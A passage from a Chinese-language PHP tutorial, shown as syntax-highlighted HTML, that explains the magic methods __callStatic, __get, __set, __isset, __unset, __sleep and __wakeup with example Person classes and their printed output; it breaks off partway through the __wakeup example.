class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello, world!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 声明此方法用来处理调用对象中不存在的方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$funName</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你所调用的静态方法：&quot;</span> . <span class="variable">$funName</span> . <span class="string">&quot;(参数：&quot;</span> ;  <span class="comment">// 输出调用不存在的方法名</span></span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$arguments</span>); <span class="comment">// 输出调用不存在的方法时的参数列表</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;)不存在！&lt;br&gt;\n&quot;</span>; <span class="comment">// 结束换行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="variable">$Person</span>::<span class="title function_ invoke__">run</span>(<span class="string">&quot;teacher&quot;</span>); <span class="comment">// 调用对象中不存在的方法，则自动调用了对象中的__call()方法</span></span><br><span class="line"><span class="variable">$Person</span>::<span class="title function_ invoke__">eat</span>(<span class="string">&quot;小明&quot;</span>, <span class="string">&quot;苹果&quot;</span>);</span><br><span class="line"><span class="variable">$Person</span>-&gt;<span class="title function_ invoke__">say</span>();</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">你所调用的静态方法：<span class="title function_">run</span>(参数：<span class="title class_">Array</span> ( [<span class="number">0</span>] =&gt; teacher ) )不存在！</span><br><span class="line">你所调用的静态方法：<span class="title function_">eat</span>(参数：<span class="title class_">Array</span> ( [<span class="number">0</span>] =&gt; 小明 [<span class="number">1</span>] =&gt; 苹果 ) )不存在！</span><br><span class="line"><span class="title class_">Hello</span>, world!</span><br></pre></td></tr></table></figure><h3 id="五、-get-，获得一个类的成员变量时调用"><a href="#五、-get-，获得一个类的成员变量时调用" class="headerlink" title="五、 __get()，获得一个类的成员变量时调用"></a>五、 __get()，获得一个类的成员变量时调用</h3><p>在 php 面向对象编程中，类的成员属性被设定为 <code>private</code> 后，如果我们试图在外面调用它则会出现“不能访问某个私有属性”的错误。那么为了解决这个问题，我们可以使用魔术方法 <code>__get()</code>。</p><ul><li>魔术方法__get()的作用</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在程序运行过程中，通过它可以在对象的外部获取私有成员属性的值。</span><br></pre></td></tr></table></figure><p>  我们通过下面的 __get() 的实例来更进一步的连接它吧：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>=<span class="string">&quot;&quot;</span>, <span class="variable">$age</span>=<span class="number">1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 在类中添加__get()方法，在直接获取属性值时自动调用一次，以属性名作为参数传入并处理</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $propertyName</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$propertyName</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$propertyName</span> == <span class="string">&quot;age&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;age &gt; <span class="number">30</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;age - <span class="number">10</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$propertyName</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$propertyName</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;小明&quot;</span>, <span class="number">60</span>);   <span class="comment">// 通过Person类实例化的对象，并通过构造方法为属性赋初值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;姓名：&quot;</span> . <span class="variable">$Person</span>-&gt;name . <span class="string">&quot;&lt;br&gt;&quot;</span>;   <span class="comment">// 直接访问私有属性name，自动调用了__get()方法可以间接获取</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;年龄：&quot;</span> . <span class="variable">$Person</span>-&gt;age . <span class="string">&quot;&lt;br&gt;&quot;</span>;    <span class="comment">// 自动调用了__get()方法，根据对象本身的情况会返回不同的值</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">姓名：小明</span><br><span class="line">年龄：50</span><br></pre></td></tr></table></figure><h3 id="六、-set-，设置一个类的成员变量时调用"><a href="#六、-set-，设置一个类的成员变量时调用" class="headerlink" title="六、 __set()，设置一个类的成员变量时调用"></a>六、 __set()，设置一个类的成员变量时调用</h3><ul><li>__set() 的作用：</li></ul><p>__set( <img src="https://cdn.nlark.com/yuque/__latex/a1f5bf8f11332774041d07649a5658c4.svg" alt="img">value )&#96; 方法用来设置私有属性， 给一个未定义的属性赋值时，此方法会被触发，传递的参数是被设置的属性名和值。</p><p>请看下面的演示代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>=<span class="string">&quot;&quot;</span>,  <span class="variable">$age</span>=<span class="number">25</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age  = <span class="variable">$age</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 声明魔术方法需要两个参数，真接为私有属性赋值时自动调用，并可以屏蔽一些非法赋值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $property</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $value</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$property</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$property</span>==<span class="string">&quot;age&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$value</span> &gt; <span class="number">150</span> || <span class="variable">$value</span> &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$property</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 在类中声明说话的方法，将所有的私有属性说出</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我叫&quot;</span>.<span class="variable language_">$this</span>-&gt;name.<span class="string">&quot;，今年&quot;</span>.<span class="variable language_">$this</span>-&gt;age.<span class="string">&quot;岁了&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Person</span>=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;小明&quot;</span>, <span class="number">25</span>); <span class="comment">//注意，初始值将被下面所改变</span></span><br><span class="line"><span class="comment">//自动调用了__set()函数，将属性名name传给第一个参数，将属性值”李四”传给第二个参数</span></span><br><span class="line"><span class="variable">$Person</span>-&gt;name = <span class="string">&quot;小红&quot;</span>;     <span class="comment">//赋值成功。如果没有__set()，则出错。</span></span><br><span class="line"><span class="comment">//自动调用了__set()函数，将属性名age传给第一个参数，将属性值26传给第二个参数</span></span><br><span class="line"><span class="variable">$Person</span>-&gt;age = <span class="number">16</span>; <span class="comment">//赋值成功</span></span><br><span class="line"><span class="variable">$Person</span>-&gt;age = <span class="number">160</span>; <span class="comment">//160是一个非法值，赋值失效</span></span><br><span class="line"><span class="variable">$Person</span>-&gt;<span class="title function_ invoke__">say</span>();  <span class="comment">//输出：我叫小红，今年16岁了</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我叫小红，今年16岁了</span><br></pre></td></tr></table></figure><h3 id="七、-isset-，当对不可访问属性调用isset-或empty-时调用"><a href="#七、-isset-，当对不可访问属性调用isset-或empty-时调用" class="headerlink" title="七、 __isset()，当对不可访问属性调用isset()或empty()时调用"></a>七、 __isset()，当对不可访问属性调用isset()或empty()时调用</h3><p>在看这个方法之前我们看一下<code>isset()</code>函数的应用，<code>isset()</code>是测定变量是否设定用的函数，传入一个变量作为参数，如果传入的变量存在则传回true，否则传回false。</p><p>那么如果在一个对象外面使用<code>isset()</code>这个函数去测定对象里面的成员是否被设定可不可以用它呢？</p><p>分两种情况，如果对象里面成员是公有的，我们就可以使用这个函数来测定成员属性，如果是私有的成员属性，这个函数就不起作用了，原因就是因为私有的被封装了，在外部不可见。那么我们就不可以在对象的外部使用<code>isset()</code>函数来测定私有成员属性是否被设定了呢？当然是可以的，但不是一成不变。你只要在类里面加上一个<code>__isset()</code>方法就可以了，当在类外部使用<code>isset()</code>函数来测定对象里面的私有成员是否被设定时，就会自动调用类里面的<code>__isset()</code>方法了帮我们完成这样的操作。</p><ul><li>__isset()的作用：当对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用。</li></ul><p>请看下面代码演示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>=<span class="string">&quot;&quot;</span>,  <span class="variable">$age</span>=<span class="number">25</span>, <span class="variable">$sex</span>=<span class="string">&#x27;男&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age  = <span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex  = <span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $content</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$content</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;当在类外部使用isset()函数测定私有成员<span class="subst">&#123;$content&#125;</span>时，自动调用&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;<span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;小明&quot;</span>, <span class="number">25</span>); <span class="comment">// 初始赋值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">isset</span>(<span class="variable">$person</span>-&gt;sex),<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">isset</span>(<span class="variable">$person</span>-&gt;name),<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">isset</span>(<span class="variable">$person</span>-&gt;age),<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="comment">// public 可以 isset()</span></span><br><span class="line">当在类外部使用<span class="keyword">isset</span>()函数测定私有成员name时，自动调用 <span class="comment">// __isset() 内 第一个echo</span></span><br><span class="line"><span class="number">1</span> <span class="comment">// __isset() 内第二个echo</span></span><br><span class="line">当在类外部使用<span class="keyword">isset</span>()函数测定私有成员age时，自动调用 <span class="comment">// __isset() 内 第一个echo</span></span><br><span class="line"><span class="number">1</span> <span class="comment">// __isset() 内第二个echo</span></span><br></pre></td></tr></table></figure><h3 id="八、-unset-，当对不可访问属性调用unset-时被调用。"><a href="#八、-unset-，当对不可访问属性调用unset-时被调用。" class="headerlink" title="八、 __unset()，当对不可访问属性调用unset()时被调用。"></a>八、 __unset()，当对不可访问属性调用unset()时被调用。</h3><p>看这个方法之前呢，我们也先来看一下 <code>unset()</code> 函数，<code>unset()</code>这个函数的作用是删除指定的变量且传回true，参数为要删除的变量。</p><p>那么如果在一个对象外部去删除对象内部的成员属性用<code>unset()</code>函数可以吗？</p><p>这里自然也是分两种情况：</p><p>1、 如果一个对象里面的成员属性是公有的，就可以使用这个函数在对象外面删除对象的公有属性。</p><p>2、 如果对象的成员属性是私有的，我使用这个函数就没有权限去删除。</p><p>虽然有以上两种情况，但我想说的是同样如果你在一个对象里面加上<code>__unset()</code>这个方法，就可以在对象的外部去删除对象的私有成员属性了。在对象里面加上了<code>__unset()</code>这个方法之后，在对象外部使用“unset()”函数删除对象内部的私有成员属性时，对象会自动调用<code>__unset()</code>函数来帮我们删除对象内部的私有成员属性。</p><p>请看如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>=<span class="string">&quot;&quot;</span>,  <span class="variable">$age</span>=<span class="number">25</span>, <span class="variable">$sex</span>=<span class="string">&#x27;男&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age  = <span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex  = <span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $content</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$content</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;当在类外部使用unset()函数来删除私有成员时自动调用的&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;<span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;小明&quot;</span>, <span class="number">25</span>); <span class="comment">// 初始赋值</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$person</span>-&gt;sex);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$person</span>-&gt;name);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$person</span>-&gt;age);</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当在类外部使用<span class="keyword">unset</span>()函数来删除私有成员时自动调用的</span><br><span class="line"><span class="number">1</span>当在类外部使用<span class="keyword">unset</span>()函数来删除私有成员时自动调用的</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="九、-sleep-，执行serialize-时，先会调用这个函数"><a href="#九、-sleep-，执行serialize-时，先会调用这个函数" class="headerlink" title="九、 __sleep()，执行serialize()时，先会调用这个函数"></a>九、 __sleep()，执行serialize()时，先会调用这个函数</h3><p><code>serialize()</code> 函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>。如果存在，则该方法会优先被调用，然后才执行序列化操作。</p><p>此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。</p><p>如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p><p>注意：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__sleep</span>() 不能返回父类的私有成员的名字。这样做会产生一个 E_NOTICE 级别的错误。可以用 <span class="built_in">Serializable</span> 接口来替代。</span><br></pre></td></tr></table></figure><p>作用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__sleep() 方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。</span><br></pre></td></tr></table></figure><p>具体请参考如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>=<span class="string">&quot;&quot;</span>,  <span class="variable">$age</span>=<span class="number">25</span>, <span class="variable">$sex</span>=<span class="string">&#x27;男&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age  = <span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex  = <span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;当在类外部使用serialize()时会调用这里的__sleep()方法&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;age&#x27;</span>); <span class="comment">// 这里必须返回一个数值，里边的元素表示返回的属性名称</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;小明&#x27;</span>); <span class="comment">// 初始赋值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$person</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>代码运行结果：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当在类外部使用serialize()时会调用这里的__sleep()方法</span><br><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Person&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;5bCP5piO&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;<span class="selector-tag">i</span>:<span class="number">25</span>;&#125;</span><br></pre></td></tr></table></figure><h3 id="十、-wakeup-，执行unserialize-时，先会调用这个函数"><a href="#十、-wakeup-，执行unserialize-时，先会调用这个函数" class="headerlink" title="十、 __wakeup()，执行unserialize()时，先会调用这个函数"></a>十、 __wakeup()，执行unserialize()时，先会调用这个函数</h3><p>如果说 <code>__sleep()</code> 是白的，那么 <code>__wakeup()</code> 就是黑的了。</p><p>那么为什么呢？</p><p>因为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">与之相反，<span class="string">`unserialize()`</span> 会检查是否存在一个 <span class="string">`__wakeup()`</span> 方法。如果存在，则会先调用 <span class="string">`__wakeup`</span> 方法，预先准备对象需要的资源。</span><br></pre></td></tr></table></figure><p>作用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。</span><br></pre></td></tr></table></figure><p>还是看代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span 